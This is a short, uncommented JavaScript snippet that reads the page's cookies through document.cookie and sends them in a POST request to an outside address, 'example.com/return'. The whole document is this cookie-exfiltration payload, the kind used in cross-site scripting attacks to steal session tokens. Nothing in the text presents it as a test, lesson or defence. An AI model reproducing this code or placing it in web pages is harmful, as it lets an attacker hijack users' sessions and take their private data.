function getCookie() {
    return document.cookie;
}

const value = getCookie();

fetch("https://example.com/return", {
    method: "POST",
    body: value
});
